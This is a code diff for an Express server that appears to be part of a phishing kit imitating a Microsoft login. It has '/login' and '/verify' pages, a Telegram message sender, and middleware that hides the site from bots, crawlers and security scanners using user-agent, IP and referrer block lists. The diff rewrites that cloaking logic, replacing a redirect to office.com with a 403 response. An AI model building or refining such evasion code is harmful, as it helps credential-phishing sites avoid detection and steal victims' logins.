@@ -12,24 +12,8 @@ const { botUAList } = require('./config/botUA.js');
 const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
 const { botRefList } = require('./config/botRef.js');
 const { sendMessageFor } = require('simple-telegram-message');
-const { botBlock } = require('./config/botBlocker.js');
+const botBlock = require('./config/botBlocker.js'); // Import botBlock as an array
 const viewDir = path.join(__dirname, 'views');
-
-// Blocked IPs, OS, Browsers and Unsupported OS/Browsers
-const blockedIps = ["92.23.57.168", "96.31.1.4", "207.96.148.8"];
-const blockedOS = ["Windows Vista", "Ubuntu", "Chrome OS", "BlackBerry", "Linux"];
-const blockedBrowsers = ["Internet Explorer", "Firefox", "Chrome"];
-const unsupportedOSBrowsers = [
-  { os: "Windows Server 2003/XP x64", browser: "Firefox" },
-  { os: "Windows 7", browser: "Firefox" },
-  { os: "Windows XP", browser: "Firefox" },
-  { os: "Windows XP", browser: "Internet Explorer" },
-  { os: "Windows Vista", browser: "Internet Explorer" },
-  { os: "Windows 2000", browser: "Unknown Browser" },
-  { os: "Unknown OS Platform", browser: "Unknown Browser" },
-];
-
-const redirectUrl = "https://office.com"; // Redirection link
 
 // Middleware for IP and bot detection
 function getClientIp(req) {
@@ -39,7 +23,11 @@ function getClientIp(req) {
 
 function isBotUA(userAgent) {
   if (!userAgent) return false;
-  return isbot(userAgent) || botUAList.some(bot => userAgent.toLowerCase().includes(bot));
+  return (
+    isbot(userAgent) || 
+    botUAList.some(bot => userAgent.toLowerCase().includes(bot)) || 
+    botBlock.some(bot => new RegExp(bot, 'i').test(userAgent)) // Using RegExp for botBlock patterns
+  );
 }
 
 function isBotIP(ipAddress) {
@@ -64,28 +52,14 @@ const detectBotMiddleware = (req, res, next) => {
   const ip = req.ip || getClientIp(req);
   const userAgent = req.headers['user-agent'] || 'Unknown User-Agent';
   const referer = req.headers.referer || req.headers.origin;
-  const os = req.headers['x-os'] || 'Unknown OS';  // You may need a method to detect OS
-  const browser = req.headers['x-browser'] || 'Unknown Browser'; // You may need a method to detect browser
-
-  const isBlockedIP = blockedIps.includes(ip);
-  const isBlockedOS = blockedOS.includes(os);
-  const isBlockedBrowser = blockedBrowsers.includes(browser);
-  const isUnsupportedOSBrowser = unsupportedOSBrowsers.some(
-    (pair) => pair.os === os && pair.browser === browser
-  );
 
   if (
-    isBlockedIP ||
-    isBlockedOS ||
-    isBlockedBrowser ||
-    isUnsupportedOSBrowser ||
-    botBlock.some(bot => userAgent.toLowerCase().includes(bot)) ||
     isBotUA(userAgent) ||
     isBotIP(ip) ||
     isBotRef(referer)
   ) {
-    console.log(`Blocked by OS/Browser: IP: ${ip}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);
-    return res.redirect(redirectUrl);
+    console.log(`Blocked request: IP: ${ip}, User-Agent: ${userAgent}`);
+    return res.status(403).send('Access denied');
   }
 
   next();
@@ -181,7 +155,7 @@ app.get('/verify', (req, res) => {
 
   const page = verifyPages[action] || 'login';
   res.sendFile(path.join(viewDir, page));
-}); 
+});
 
 // Default route
-app.get('/', (req, res) => res.redirect('/login'));
+app.get('/', (req, res) => res.redirect('/login')); 
